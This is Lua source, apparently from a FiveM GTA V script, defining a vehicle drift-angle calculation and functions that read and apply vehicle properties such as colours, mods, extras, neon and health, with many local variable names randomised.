MaciasFunc.Game.vehicleAngle = function(sBeMK8E9e)
    if not sBeMK8E9e then
        return false
    end
    local Uetn66JFLuDy, e2EEOAzqsHmad3eVvglQ, zwmqoDUl670XXdEs = table.unpack(GetEntityVelocity(sBeMK8E9e))
    local krrVNvTupj = math.sqrt(Uetn66JFLuDy * Uetn66JFLuDy + e2EEOAzqsHmad3eVvglQ * e2EEOAzqsHmad3eVvglQ)
    local HkzghErv5EUxw5LnNkvCX, spbOsgJLRTIrPh6Mg4, xwmyZW7dFH = table.unpack(GetEntityRotation(sBeMK8E9e, 0))
    local O, ENo = -math.sin(math.rad(xwmyZW7dFH)), math.cos(math.rad(xwmyZW7dFH))
    if GetEntitySpeed(sBeMK8E9e) * 3.6 < 5 or GetVehicleCurrentGear(sBeMK8E9e) == 0 then
        return 0, krrVNvTupj
    end
    local C0helfga6O2Abz_ = (O * Uetn66JFLuDy + ENo * e2EEOAzqsHmad3eVvglQ) / krrVNvTupj
    if C0helfga6O2Abz_ > 0.966 or C0helfga6O2Abz_ < 0 then
        return 0, krrVNvTupj
    end
    return math.deg(math.acos(C0helfga6O2Abz_)) * 0.5, krrVNvTupj
end
MaciasFunc.Game.GetVehicleProperties = function(VAZnMXxFa)
    if DoesEntityExist(VAZnMXxFa) then
        local gIlMtmA, DlzfQO2RRa0 = GetVehicleColours(VAZnMXxFa)
        local FFw, o_Xo8ouL21 = GetVehicleExtraColours(VAZnMXxFa)
        local OBL = {}
        for id = 0, 12 do
            if DoesExtraExist(VAZnMXxFa, id) then
                local i = IsVehicleExtraTurnedOn(VAZnMXxFa, id) == 1
                OBL[tostring(id)] = i
            end
        end
        return {
            model = GetEntityModel(VAZnMXxFa),
            plate = MaciasFunc.Math.Trim(GetVehicleNumberPlateText(VAZnMXxFa)),
            plateIndex = GetVehicleNumberPlateTextIndex(VAZnMXxFa),
            bodyHealth = MaciasFunc.Math.Round(GetVehicleBodyHealth(VAZnMXxFa), 1),
            engineHealth = MaciasFunc.Math.Round(GetVehicleEngineHealth(VAZnMXxFa), 1),
            fuelLevel = MaciasFunc.Math.Round(GetVehicleFuelLevel(VAZnMXxFa), 1),
            dirtLevel = MaciasFunc.Math.Round(GetVehicleDirtLevel(VAZnMXxFa), 1),
            color1 = gIlMtmA,
            color2 = DlzfQO2RRa0,
            pearlescentColor = FFw,
            wheelColor = o_Xo8ouL21,
            wheels = GetVehicleWheelType(VAZnMXxFa),
            windowTint = GetVehicleWindowTint(VAZnMXxFa),
            xenonColor = GetVehicleXenonLightsColour(VAZnMXxFa),
            neonEnabled = {
                IsVehicleNeonLightEnabled(VAZnMXxFa, 0),
                IsVehicleNeonLightEnabled(VAZnMXxFa, 1),
                IsVehicleNeonLightEnabled(VAZnMXxFa, 2),
                IsVehicleNeonLightEnabled(VAZnMXxFa, 3)
            },
            neonColor = table.pack(GetVehicleNeonLightsColour(VAZnMXxFa)),
            extras = OBL,
            tyreSmokeColor = table.pack(GetVehicleTyreSmokeColor(VAZnMXxFa)),
            modSpoilers = GetVehicleMod(VAZnMXxFa, 0),
            modFrontBumper = GetVehicleMod(VAZnMXxFa, 1),
            modRearBumper = GetVehicleMod(VAZnMXxFa, 2),
            modSideSkirt = GetVehicleMod(VAZnMXxFa, 3),
            modExhaust = GetVehicleMod(VAZnMXxFa, 4),
            modFrame = GetVehicleMod(VAZnMXxFa, 5),
            modGrille = GetVehicleMod(VAZnMXxFa, 6),
            modHood = GetVehicleMod(VAZnMXxFa, 7),
            modFender = GetVehicleMod(VAZnMXxFa, 8),
            modRightFender = GetVehicleMod(VAZnMXxFa, 9),
            modRoof = GetVehicleMod(VAZnMXxFa, 10),
            modEngine = GetVehicleMod(VAZnMXxFa, 11),
            modBrakes = GetVehicleMod(VAZnMXxFa, 12),
            modTransmission = GetVehicleMod(VAZnMXxFa, 13),
            modHorns = GetVehicleMod(VAZnMXxFa, 14),
            modSuspension = GetVehicleMod(VAZnMXxFa, 15),
            modArmor = GetVehicleMod(VAZnMXxFa, 16.0),
            modTurbo = IsToggleModOn(VAZnMXxFa, 18),
            modSmokeEnabled = IsToggleModOn(VAZnMXxFa, 20),
            modXenon = IsToggleModOn(VAZnMXxFa, 22),
            modFrontWheels = GetVehicleMod(VAZnMXxFa, 23),
            modBackWheels = GetVehicleMod(VAZnMXxFa, 24),
            modPlateHolder = GetVehicleMod(VAZnMXxFa, 25),
            modVanityPlate = GetVehicleMod(VAZnMXxFa, 26),
            modTrimA = GetVehicleMod(VAZnMXxFa, 27),
            modOrnaments = GetVehicleMod(VAZnMXxFa, 28),
            modDashboard = GetVehicleMod(VAZnMXxFa, 29),
            modDial = GetVehicleMod(VAZnMXxFa, 30),
            modDoorSpeaker = GetVehicleMod(VAZnMXxFa, 31),
            modSeats = GetVehicleMod(VAZnMXxFa, 32),
            modSteeringWheel = GetVehicleMod(VAZnMXxFa, 33),
            modShifterLeavers = GetVehicleMod(VAZnMXxFa, 34),
            modAPlate = GetVehicleMod(VAZnMXxFa, 35),
            modSpeakers = GetVehicleMod(VAZnMXxFa, 36),
            modTrunk = GetVehicleMod(VAZnMXxFa, 37),
            modHydrolic = GetVehicleMod(VAZnMXxFa, 38),
            modEngineBlock = GetVehicleMod(VAZnMXxFa, 39),
            modAirFilter = GetVehicleMod(VAZnMXxFa, 40),
            modStruts = GetVehicleMod(VAZnMXxFa, 41),
            modArchCover = GetVehicleMod(VAZnMXxFa, 42),
            modAerials = GetVehicleMod(VAZnMXxFa, 43),
            modTrimB = GetVehicleMod(VAZnMXxFa, 44),
            modTank = GetVehicleMod(VAZnMXxFa, 45),
            modWindows = GetVehicleMod(VAZnMXxFa, 46),
            modLivery = GetVehicleLivery(VAZnMXxFa)
        }
    else
        return
    end
end
MaciasFunc.Game.SetVehicleProperties = function(vehicle, props)
    if DoesEntityExist(vehicle) then
        local JzeDqE, hW6QviZ7q = GetVehicleColours(vehicle)
        local CJTKzoHNoaNKKZoYH, BCMSpszwer = GetVehicleExtraColours(vehicle)
        SetVehicleModKit(vehicle, 0)
        if props.plate then
            SetVehicleNumberPlateText(vehicle, props.plate)
        end
        if props.plateIndex then
            SetVehicleNumberPlateTextIndex(vehicle, props.plateIndex)
        end
        if props.bodyHealth then
            SetVehicleBodyHealth(vehicle, props.bodyHealth + 0)
        end
        if props.engineHealth then
            SetVehicleEngineHealth(vehicle, props.engineHealth + 0)
        end
        if props.fuelLevel then
            SetVehicleFuelLevel(vehicle, props.fuelLevel + 0)
        end
        if props.dirtLevel then
            SetVehicleDirtLevel(vehicle, props.dirtLevel + 0)
        end
        if props.color1 then
            SetVehicleColours(vehicle, props.color1, hW6QviZ7q)
        end
        if props.color2 then
            SetVehicleColours(vehicle, props.color1 or JzeDqE, props.color2)
        end
        if props.pearlescentColor then
            SetVehicleExtraColours(vehicle, props.pearlescentColor, BCMSpszwer)
        end
        if props.wheelColor then
            SetVehicleExtraColours(vehicle, props.pearlescentColor or CJTKzoHNoaNKKZoYH, props.wheelColor)
        end
        if props.wheels then
            SetVehicleWheelType(vehicle, props.wheels)
        end
        if props.windowTint then
            SetVehicleWindowTint(vehicle, props.windowTint)
        end
        if props.neonEnabled then
            SetVehicleNeonLightEnabled(vehicle, 0, props.neonEnabled[1])
            SetVehicleNeonLightEnabled(vehicle, 1, props.neonEnabled[2])
            SetVehicleNeonLightEnabled(vehicle, 2, props.neonEnabled[3])
            SetVehicleNeonLightEnabled(vehicle, 3, props.neonEnabled[4])
        end
        if props.extras then
            for YVyg0, h in pairs(props.extras) do
                if h then
                    SetVehicleExtra(vehicle, tonumber(YVyg0), 0)
                else
                    SetVehicleExtra(vehicle, tonumber(YVyg0), 1)
                end
            end
        end
        if props.neonColor then
            SetVehicleNeonLightsColour(
                vehicle,
                props.neonColor[1],
                props.neonColor[2],
                props.neonColor[3]
            )
        end
        if props.xenonColor then
            SetVehicleXenonLightsColour(vehicle, props.xenonColor)
        end
        if props.modSmokeEnabled then
            ToggleVehicleMod(vehicle, 20, true)
        end
        if props.tyreSmokeColor then
            SetVehicleTyreSmokeColor(
                vehicle,
                props.tyreSmokeColor[1],
                props.tyreSmokeColor[2],
                props.tyreSmokeColor[3]
            )
        end
        if props.modSpoilers then
            SetVehicleMod(vehicle, 0, props.modSpoilers, false)
        end
        if props.modFrontBumper then
            SetVehicleMod(vehicle, 1, props.modFrontBumper, false)
        end
        if props.modRearBumper then
            SetVehicleMod(vehicle, 2, props.modRearBumper, false)
        end
        if props.modSideSkirt then
            SetVehicleMod(vehicle, 3, props.modSideSkirt, false)
        end
        if props.modExhaust then
            SetVehicleMod(vehicle, 4, props.modExhaust, false)
        end
        if props.modFrame then
            SetVehicleMod(vehicle, 5, props.modFrame, false)
        end
        if props.modGrille then
            SetVehicleMod(vehicle, 6, props.modGrille, false)
        end
        if props.modHood then
            SetVehicleMod(vehicle, 7, props.modHood, false)
        end
        if props.modFender then
            SetVehicleMod(vehicle, 8, props.modFender, false)
        end
        if props.modRightFender then
            SetVehicleMod(vehicle, 9, props.modRightFender, false)
        end
        if props.modRoof then
            SetVehicleMod(vehicle, 10, props.modRoof, false)
        end
        if props.modEngine then
            SetVehicleMod(vehicle, 11, props.modEngine, false)
        end
        if props.modBrakes then
            SetVehicleMod(vehicle, 12, props.modBrakes, false)
        end
        if props.modTransmission then
            SetVehicleMod(vehicle, 13, props.modTransmission, false)
        end
        if props.modHorns then
            SetVehicleMod(vehicle, 14, props.modHorns, false)
        end
        if props.modSuspension then
            SetVehicleMod(vehicle, 15, props.modSuspension, false)
        end
        if props.modArmor then
            SetVehicleMod(vehicle, 16.0, props.modArmor, false)
        end
        if props.modTurbo then
            ToggleVehicleMod(vehicle, 18, props.modTurbo)
        end
        if props.modXenon then
            ToggleVehicleMod(vehicle, 22, props.modXenon)
        end
        if props.modFrontWheels then
            SetVehicleMod(vehicle, 23, props.modFrontWheels, false)
        end
        if props.modBackWheels then
            SetVehicleMod(vehicle, 24, props.modBackWheels, false)
        end
        if props.modPlateHolder then
            SetVehicleMod(vehicle, 25, props.modPlateHolder, false)
        end
        if props.modVanityPlate then
            SetVehicleMod(vehicle, 26, props.modVanityPlate, false)
        end
        if props.modTrimA then
            SetVehicleMod(vehicle, 27, props.modTrimA, false)
        end
        if props.modOrnaments then
            SetVehicleMod(vehicle, 28, props.modOrnaments, false)
        end
        if props.modDashboard then
            SetVehicleMod(vehicle, 29, props.modDashboard, false)
        end
        if props.modDial then
            SetVehicleMod(vehicle, 30, props.modDial, false)
        end
        if props.modDoorSpeaker then
            SetVehicleMod(vehicle, 31, props.modDoorSpeaker, false)
        end
        if props.modSeats then
            SetVehicleMod(vehicle, 32, props.modSeats, false)
        end
        if props.modSteeringWheel then
            SetVehicleMod(vehicle, 33, props.modSteeringWheel, false)
        end
        if props.modShifterLeavers then
            SetVehicleMod(vehicle, 34, props.modShifterLeavers, false)
        end
        if props.modAPlate then
            SetVehicleMod(vehicle, 35, props.modAPlate, false)
        end
        if props.modSpeakers then
            SetVehicleMod(vehicle, 36, props.modSpeakers, false)
        end
        if props.modTrunk then
            SetVehicleMod(vehicle, 37, props.modTrunk, false)
        end
        if props.modHydrolic then
            SetVehicleMod(vehicle, 38, props.modHydrolic, false)
        end
        if props.modEngineBlock then
            SetVehicleMod(vehicle, 39, props.modEngineBlock, false)
        end
        if props.modAirFilter then
            SetVehicleMod(vehicle, 40, props.modAirFilter, false)
        end
        if props.modStruts then
            SetVehicleMod(vehicle, 41, props.modStruts, false)
        end
        if props.modArchCover then
            SetVehicleMod(vehicle, 42, props.modArchCover, false)
        end
        if props.modAerials then
            SetVehicleMod(vehicle, 43, props.modAerials, false)
        end
        if props.modTrimB then
            SetVehicleMod(vehicle, 44, props.modTrimB, false)
        end
        if props.modTank then
            SetVehicleMod(vehicle, 45, props.modTank, false)
        end
        if props.modWindows then
            SetVehicleMod(vehicle, 46, props.modWindows, false)
        end
        if props.modLivery then
            SetVehicleMod(vehicle, 48, props.modLivery, false)
            SetVehicleLivery(vehicle, props.modLivery)
        end
    end
end
